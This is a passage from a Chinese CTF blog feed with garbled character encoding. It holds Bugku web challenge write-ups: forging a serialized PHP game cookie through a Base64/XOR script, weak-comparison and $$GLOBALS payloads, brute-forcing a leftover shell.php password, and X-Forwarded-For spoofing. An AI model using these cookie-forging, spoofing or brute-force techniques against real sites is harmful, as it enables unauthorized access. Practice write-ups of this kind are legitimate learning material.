&#123;</span>chr1 = input.charCodeAt(i++);chr2 = input.charCodeAt(i++);chr3 = input.charCodeAt(i++);enc1 = chr1 &gt;&gt; 2;<span class="handlebars"><span class="xml">enc2 = ((chr1 &amp; 3) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">4</span>) | (<span class="hljs-attr">chr2</span> &gt;</span>&gt; 4);</span></span><span class="handlebars"><span class="xml">enc3 = ((chr2 &amp; 15) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">2</span>) | (<span class="hljs-attr">chr3</span> &gt;</span>&gt; 6);</span></span>enc4 = chr3 &amp; 63;<span class="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>enc3 = enc4 = 64;<span class="javascript">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>enc4 = 64;&#125;output = output +_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +_keyStr.charAt(enc3) + _keyStr.charAt(enc4);&#125;<span class="actionscript"><span class="hljs-keyword">return</span> output;</span>&#125; <span class="actionscript"><span class="hljs-comment">// public method for decoding</span></span><span class="actionscript"><span class="hljs-keyword">this</span>.decode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(input)</span> </span>&#123;</span><span class="actionscript"><span class="hljs-keyword">var</span> output = <span class="hljs-string">""</span>;</span><span class="actionscript"><span class="hljs-keyword">var</span> chr1, chr2, chr3;</span><span class="actionscript"><span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span><span class="actionscript"><span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span><span class="javascript">input = input.replace(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">""</span>);</span><span class="actionscript"><span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>enc1 = _keyStr.indexOf(input.charAt(i++));enc2 = _keyStr.indexOf(input.charAt(i++));enc3 = _keyStr.indexOf(input.charAt(i++));enc4 = _keyStr.indexOf(input.charAt(i++));<span class="handlebars"><span class="xml">chr1 = (enc1 <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">2</span>) | (<span class="hljs-attr">enc2</span> &gt;</span>&gt; 4);</span></span><span class="handlebars"><span class="xml">chr2 = ((enc2 &amp; 15) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">4</span>) | (<span class="hljs-attr">enc3</span> &gt;</span>&gt; 2);</span></span>chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;<span class="javascript">output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr1);</span>if (enc3 != 64) &#123;<span class="javascript">output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr2);</span>&#125;if (enc4 != 64) &#123;<span class="javascript">output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr3);</span>&#125;&#125;<span class="actionscript"><span class="hljs-comment">//output = _utf8_decode(output);</span></span><span class="actionscript"><span class="hljs-keyword">return</span> output;</span>&#125; <span class="actionscript"><span class="hljs-comment">// private method for UTF-8 encoding</span></span><span class="actionscript">_utf8_encode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(string)</span> </span>&#123;</span><span class="javascript">string = string.replace(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">"\n"</span>);</span><span class="actionscript"><span class="hljs-keyword">var</span> utftext = <span class="hljs-string">""</span>;</span><span class="actionscript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.length; n++) &#123;</span><span class="actionscript"><span class="hljs-keyword">var</span> c = string.charCodeAt(n);</span>if (c &lt; 128) &#123;<span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode(c);</span><span class="actionscript">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span><span class="actionscript">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>&#125; &#125;<span class="actionscript"><span class="hljs-keyword">return</span> utftext;</span>&#125; <span class="actionscript"><span class="hljs-comment">// private method for UTF-8 decoding</span></span><span class="actionscript">_utf8_decode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(utftext)</span> </span>&#123;</span><span class="actionscript"><span class="hljs-keyword">var</span> string = <span class="hljs-string">""</span>;</span><span class="actionscript"><span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span><span class="actionscript"><span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span><span class="actionscript"><span class="hljs-keyword">while</span> ( i &lt; utftext.length ) &#123;</span>c = utftext.charCodeAt(i);if (c &lt; 128) &#123;<span class="javascript">string += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>i++;<span class="actionscript">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>c2 = utftext.charCodeAt(i+1);<span class="javascript">string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>i += 2;<span class="actionscript">&#125; <span class="hljs-keyword">else</span> &#123;</span>c2 = utftext.charCodeAt(i+1);c3 = utftext.charCodeAt(i+2);<span class="javascript">string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>i += 3;&#125;&#125;<span class="actionscript"><span class="hljs-keyword">return</span> string;</span>&#125;&#125;<span class="actionscript"><span class="hljs-comment">//åŸæ¥cookie</span></span><span class="actionscript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">"UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE="</span>;</span><span class="actionscript"><span class="hljs-comment">//è¿›è¡ŒåŠ å¯†ï¼Œè·å–æ˜æ–‡</span></span><span class="actionscript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();</span><span class="actionscript"><span class="hljs-keyword">var</span> result = base.decode(temp);</span><span class="actionscript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">""</span>;</span>for (i = 0; i &lt; result.length; i++) &#123;<span class="actionscript"><span class="hljs-keyword">var</span> num = result[i].charCodeAt();</span>num = num ^ i;num = num - ((i % 10) + 2);<span class="javascript">result3 += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>&#125;    <span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">"åŸæ˜æ–‡ï¼š"</span>+result3+<span class="hljs-string">'&lt;br/&gt;'</span>);</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;br/&gt;'</span>);</span><span class="actionscript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">'O:5:"human":10:&#123;s:8:"xueliang";i:830;s:5:"neili";i:602;s:5:"lidao";i:95;s:6:"dingli";i:63;s:7:"waigong";i:0;s:7:"neigong";i:0;s:7:"jingyan";i:0;s:6:"yelian";i:0;s:5:"money";i:200000;s:4:"flag";s:1:"0";&#125;'</span>;</span><span class="actionscript"><span class="hljs-comment">//åç¼–ç è·å–cookie</span></span><span class="actionscript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">""</span>;</span>for (i = 0;i&lt;result3.length;i++)&#123;num = result3[i].charCodeAt();num = num + ((i % 10) + 2);num = num ^ i;<span class="javascript">result += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>&#125;<span class="actionscript"><span class="hljs-keyword">var</span> temp= base.encode(result);</span><span class="actionscript"><span class="hljs-comment">//å°†cookieè¿›è¡Œurlç¼–ç </span></span><span class="javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">"cookie:"</span>+temp+<span class="hljs-string">"&lt;/br&gt;"</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p>ç¼–ç ç»“æœ</p><div class="hljs"><pre><code class="hljs gcode">UTw<span class="hljs-number">7</span>PCxqe<span class="hljs-number">3</span>FjcC<span class="hljs-number">42</span>OThOjWtSUFYwb<span class="hljs-name">m99</span>amlzb<span class="hljs-name">G0</span>wI<span class="hljs-number">3</span>MeHBsUZ<span class="hljs-number">1</span>liZxQMWEFDXl<span class="hljs-number">8</span>EdUUOCgACd<span class="hljs-number">016</span>B<span class="hljs-number">34</span>WUlFWWTVoATEAAXF<span class="hljs-number">5</span>P<span class="hljs-number">3</span>Z<span class="hljs-number">2</span>CmYgPTY<span class="hljs-number">5</span>Pj<span class="hljs-number">90</span>FSUUaGUfL<span class="hljs-number">2</span>Z<span class="hljs-symbol">nYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4</span>FXEcXREo<span class="hljs-meta">%</span><span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB<span class="hljs-meta">%</span><span class="hljs-number">2</span>BH<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bps<span class="hljs-number">3</span><span class="hljs-symbol">nsLrP6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-meta">%</span><span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>X<span class="hljs-symbol">nJnkjNPf0</span><span class="hljs-symbol">NnRjpPD7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>k<span class="hljs-symbol">NTK0</span>dea<span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu<span class="hljs-meta">%</span><span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D</code></pre></div><p>è¿™å°±æ˜¯æˆ‘ä»¬æœŸå¾…çš„cookie,ç„¶åç”¨å·¥å…·ä¿®æ”¹cookie</p><p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" srcset="/img/loading.gif" alt="nt-9.png"></p><p>ä¿®æ»¡å±æ€§å€¼æ‰“æ€ªæ‹¿åˆ°flag</p><p><img src="https://i.loli.net/2020/11/25/5Geyh8r7vBDOqKE.png" srcset="/img/loading.gif" alt="mt-10.png"></p><p><a href="https://blog.csdn.net/weixin_41924764/article/details/109488408?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242" target="_blank" rel="noopener">å‚è€ƒ</a></p><p>è¿™é“é¢˜è™½ç„¶å¾ˆéš¾ï¼Œä½†æ˜¯åœ¨ä¸€æ­¥ä¸€æ­¥å°è¯•çš„è¿‡ç¨‹ä¸­å­¦åˆ°å¾ˆå¤šæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ”¶è·è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œæ„Ÿè°¢å¸ˆå‚…çš„wpï¼Œçœ‹äº†å¥½ä¹…æ‰åšå‡ºäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„šæœ¬</tag>
      
      <tag>php</tag>
      
      <tag>cookie</tag>
      
      <tag>ç¼–ç </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku1-10</title>
    <link href="/2020/09/06/bugku1-10/"/>
    <url>/2020/09/06/bugku1-10/</url>
    
    <content type="html"><![CDATA[<h1 id="bugkuåˆ·é¢˜è®°å½•1"><a href="#bugkuåˆ·é¢˜è®°å½•1" class="headerlink" title="bugkuåˆ·é¢˜è®°å½•1"></a>bugkuåˆ·é¢˜è®°å½•1</h1><a id="more"></a><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>æŸ¥çœ‹æºç å³å¯</p><h2 id="è®¡ç®—å™¨"><a href="#è®¡ç®—å™¨" class="headerlink" title="è®¡ç®—å™¨"></a>è®¡ç®—å™¨</h2><p>ä¿®æ”¹å‰ç«¯ä»£ç </p><p><img src="https://i.loli.net/2020/11/30/YLlnyBHGibuWfdT.png" srcset="/img/loading.gif" alt></p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>payload:</p><p><code>?what=flag</code></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><div class="hljs"><pre><code class="hljs makefile"><span class="hljs-section">POST:</span>what=flag</code></pre></div><h2 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h2><p>payload: <code>?num=1a</code></p><p>è€ƒå¯Ÿç‚¹ï¼šå¼±ç±»å‹æ¯”è¾ƒ</p><blockquote><p>=== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ</p><p>== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ</p></blockquote><p>æµ‹è¯•ä»£ç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span>var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e4456789"</span>); <span class="hljs-comment">//true</span><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//ä¸Šè¿°ä»£ç å¯è‡ªè¡Œæµ‹è¯•</span></code></pre></div><div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>è§‚å¯Ÿä¸Šè¿°ä»£ç ï¼Œ<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span> æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†adminè½¬åŒ–æˆæ•°å€¼ï¼Œå¼ºåˆ¶è½¬åŒ–,ç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬åŒ–çš„ç»“æœæ˜¯<span class="hljs-number">0</span>è‡ªç„¶å’Œ<span class="hljs-number">0</span>ç›¸ç­‰<span class="hljs-symbol">2 </span><span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span> æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†<span class="hljs-number">1</span>adminè½¬åŒ–æˆæ•°å€¼,ç»“æœä¸º<span class="hljs-number">1</span>ï¼Œè€Œâ€œadmin1â€œ==<span class="hljs-number">1</span> å´ç­‰äºé”™è¯¯ï¼Œä¹Ÿå°±æ˜¯<span class="hljs-string">"admin1"</span>è¢«è½¬åŒ–æˆäº†<span class="hljs-number">0</span>,ä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿ<span class="hljs-symbol">3 </span><span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e456789"</span>ç›¸äº’æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†<span class="hljs-number">0e</span>è¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ<span class="hljs-number">0</span>çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰</code></pre></div><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>æŸ¥çœ‹æºç åï¼Œåœ¨æœ€ä¸‹é¢çœ‹åˆ°ä¸€ä¸²ç¼–ç ï¼Œä¸ºunicodeç¼–ç </p><div class="hljs"><pre><code class="hljs c">&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">69</span>;&amp;#<span class="hljs-number">89</span>;&amp;#<span class="hljs-number">123</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">52</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">104</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">45</span>;&amp;#<span class="hljs-number">72</span>;&amp;#<span class="hljs-number">83</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">125</span>;</code></pre></div><p>ä½¿ç”¨å·¥å…·è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/11/30/LuvcilB4qgZGb9z.png" srcset="/img/loading.gif" alt></p><h2 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h2><p><strong>dnsæœåŠ¡å™¨ç”¨æ¥è§£æåŸŸåä¸ºIPï¼Œå¾ˆå¤šå›½å¤–çš„æœåŠ¡å™¨ä¸èƒ½è®¿é—®ï¼Œä¸»è¦åŸå› å°±æ˜¯DNSæœåŠ¡å™¨ä¸èƒ½è§£æé‚£äº›åŸŸå</strong></p><p><strong>hostså°±æ˜¯æœ¬åœ°ç”¨æ¥è§£æåŸŸåä¸ºIP</strong>  </p><p>å› æ­¤hostsæ–‡ä»¶ä¸­æœ‰çš„åŸŸåè®°å½•ï¼Œåœ¨æœ¬ç”µè„‘æµè§ˆå™¨ä¸­å¯ç›´æ¥ä½¿ç”¨åŸŸåè®¿é—®</p><p>ï¼ˆhostsæ–‡ä»¶éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä¿®æ”¹æ–¹å¼ä¸ºä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œè®°äº‹æœ¬åæ‰“å¼€hostsï¼‰</p><p>è·¯å¾„ä¸ºï¼š</p><div class="hljs"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc</code></pre></div><p><img src="https://i.loli.net/2020/11/30/9txPKZrvbMmBVSA.png" srcset="/img/loading.gif" alt></p><p>æ–‡ä»¶ä¿å­˜ååœ¨æµè§ˆå™¨ä¸­è®¿é—®è¯¥åŸŸå è·å¾—flag</p><h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹"><a href="#ä½ å¿…é¡»è®©ä»–åœä¸‹" class="headerlink" title="ä½ å¿…é¡»è®©ä»–åœä¸‹"></a>ä½ å¿…é¡»è®©ä»–åœä¸‹</h2><p>æ‰“å¼€é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼ŒæŠ“åŒ…è¯•è¯•</p><p>goå®Œä¹Ÿæ²¡ä»€ä¹ˆååº”ï¼Œæœ‰ç‚¹è¿·æƒ‘</p><p>ä½†æ˜¯å¤šgoå‡ æ¬¡åï¼Œå‘ç°æœ‰å¼ å›¾ç‰‡åœ¨å˜</p><p><img src="https://i.loli.net/2020/11/30/rm9ibzCH58Snupt.png" srcset="/img/loading.gif" alt></p><p>å¤šgoå‡ æ¬¡å°±å‡ºæ¥äº†flag,åŸç†è¿˜æœªçŸ¥</p><p><img src="https://i.loli.net/2020/11/30/xO1JwbyasHEdm2k.png" srcset="/img/loading.gif" alt></p><h2 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a>å˜é‡1</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">"flag1.php"</span>;highlight_file(<span class="hljs-keyword">__file__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'args'</span>]))&#123;  $args = $_GET[<span class="hljs-string">'args'</span>];  <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/^\w+$/"</span>,$args))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">"args error!"</span>);  &#125;  <span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump($$args);"</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p> é¦–å…ˆçœ‹åˆ°è¦ç”¨getæ–¹å¼æäº¤ä¸€ä¸ªargså‚æ•°ï¼Œè€Œåœ¨æœ€åä¸€è¡Œä»£ç é‡Œåˆæœ‰var_dump(&amp;&amp;args)ï¼Œäºæ˜¯ä¼ å…¥argså‚æ•°çš„å€¼ä¸ºGLOBALS,è¿™æ ·æœ€åä¸€è¡Œä»£ç å°±å˜æˆäº†var_dumpï¼ˆ&amp;GLOBALSï¼‰ï¼Œç„¶åvar_dumpå‡½æ•°è¿è¡Œä¼šè¾“å‡ºæ‰€æœ‰å˜é‡ï¼Œå¾—å‡ºflagã€‚ </p><p> <strong>Globalçš„ä½œç”¨æ˜¯å®šä¹‰å…¨å±€å˜é‡,ä½†æ˜¯è¿™ä¸ªå…¨å±€å˜é‡ä¸æ˜¯åº”ç”¨äºæ•´ä¸ªç½‘ç«™,è€Œæ˜¯åº”ç”¨äºå½“å‰é¡µé¢,åŒ…æ‹¬includeæˆ–requireçš„æ‰€æœ‰æ–‡ä»¶ã€‚</strong> </p><p> <strong>GLOBALS:ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„</strong> </p><p>å³å°†includeâ€flag.phpâ€ä½œä¸ºå…¨å±€å˜é‡åœ¨æœ¬é¡µé¢è¾“å‡º</p><p>?args=GLOBALS</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>æºç ä¸­ä¸€ä¸²ç‰¹åˆ«çš„ä»£ç jsfuck,</p><p>ç›´æ¥æ”¾åœ¨æµè§ˆå™¨çš„æ§åˆ¶å°ä¸­è¿è¡Œ</p><p><img src="https://i.loli.net/2020/11/30/WwkYd4az3l8UA1N.png" srcset="/img/loading.gif" alt></p><h2 id="å¤´ç­‰èˆ±"><a href="#å¤´ç­‰èˆ±" class="headerlink" title="å¤´ç­‰èˆ±"></a>å¤´ç­‰èˆ±</h2><p>æ‰“å¼€é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p><p>æ‰«æç›®å½•ï¼Œæ‰«å‡ºæ¥ä¸€å¤§å †æ²¡ç”¨çš„ï¼Œç›´æ¥æŠ“åŒ…</p><p>ã€‚ã€‚ã€‚ã€‚å°±å‡ºæ¥äº†</p><p><img src="https://i.loli.net/2020/11/30/LRTIs3Yt8jEmlip.png" srcset="/img/loading.gif" alt></p><h2 id="ç½‘ç«™è¢«é»‘"><a href="#ç½‘ç«™è¢«é»‘" class="headerlink" title="ç½‘ç«™è¢«é»‘"></a>ç½‘ç«™è¢«é»‘</h2><p>åå­—æç¤ºäº†ï¼Œç½‘ç«™è¢«é»‘ã€‚</p><p>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°é¼ æ ‡åŠ¨ä¸äº†ï¼Œå¯èƒ½æ˜¯è¢«é»‘åçš„åé—ç—‡</p><p>å…ˆæ‰«æç›®å½•å‘ç°äº†<code>shell.php</code>,è¿™å¯èƒ½æ˜¯ä¸Šæ¬¡é»‘å®¢ç•™ä¸‹çš„å°é©¬æ–‡ä»¶</p><p><img src="https://i.loli.net/2020/11/30/rJi2yPYftQqNCgV.png" srcset="/img/loading.gif" alt></p><p>æ‰“å¼€é¡µé¢ï¼Œéœ€è¦å¯†ç ï¼Œè¿™å°±éœ€è¦çˆ†ç ´äº†(å¯†ç ä¸ºhack)</p><p>ç¡®å®šè¦çˆ†ç ´çš„å˜é‡</p><p><img src="https://i.loli.net/2020/11/30/1bgKrVolsLa4XEh.png" srcset="/img/loading.gif" alt></p><p>åŠ è½½å¯†ç å­—å…¸</p><p><img src="https://i.loli.net/2020/11/30/LcOoCkEFrnDVsvx.png" srcset="/img/loading.gif" alt></p><p>å‡ºç°ç»“æœï¼ˆæ ¹æ®lengthç¡®å®šå¯†ç ï¼‰</p><p><img src="https://i.loli.net/2020/11/30/YX6nAbTF75tfOI4.png" srcset="/img/loading.gif" alt></p><p>å¯†ç ä¸º<code>hack</code></p><p>ç™»å½•å³å¯</p><h2 id="ç®¡ç†å‘˜ç³»ç»Ÿ"><a href="#ç®¡ç†å‘˜ç³»ç»Ÿ" class="headerlink" title="ç®¡ç†å‘˜ç³»ç»Ÿ"></a>ç®¡ç†å‘˜ç³»ç»Ÿ</h2><p>éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å‘ç°æç¤ºIP</p><p>æƒ³åˆ°äº†<code>X-FORWORADED-FOR:127.0.0.1</code></p><p>æŠ“åŒ…è¯•è¯•</p><p>åœ¨å“åº”åŒ…ä¸­å‘ç°ä¸€æ®µbase64ç¼–ç <code>dGVzdDEyMw==</code> è§£å¯†åä¸ºtest123ï¼ŒçŒœæµ‹ä¸ºç™»å½•å¯†ç </p><p>ç»“æœçœŸå¯¹äº†</p><p><img src="https://i.loli.net/2020/11/30/EuicNWmtOxRD25J.png" srcset="/img/loading.gif" alt></p><p>å½“ç„¶è¿™é¢˜ä¹Ÿå¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ–¹æ³•åšï¼Œä½†æ˜¯å¯†ç å­—å…¸éœ€è¦åŒ…å«test123</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>æŸ¥çœ‹æºç å‘ç°ä¸€æ®µjsä»£ç </p><p>å°†æœ€åçš„evalæ”¹æˆalert(),ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œå¼¹å‡ºç»“æœ</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSubmit</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">var</span> a=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"password"</span>);<span class="hljs-keyword">if</span>(<span class="hljs-string">"undefined"</span>!=<span class="hljs-keyword">typeof</span> a)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)<span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;alert(<span class="hljs-string">"Error"</span>);a.focus();<span class="hljs-keyword">return</span>!<span class="hljs-number">1</span>&#125;&#125;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"levelQuest"</span>).onsubmit=checkSubmit;</code></pre></div><p><img src="https://i.loli.net/2020/11/30/SbN4rkwL2MHlOiQ.png" srcset="/img/loading.gif" alt></p><p><code>if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</code></p><p>ç›´æ¥è¾“å…¥67d709b2b54aa2aa648cf6e87a7114f1</p><p><img src="/2020/09/06/bugku1-10/web41.png" srcset="/img/loading.gif" alt></p><h2 id="flagåœ¨indexé‡Œ"><a href="#flagåœ¨indexé‡Œ" class="headerlink" 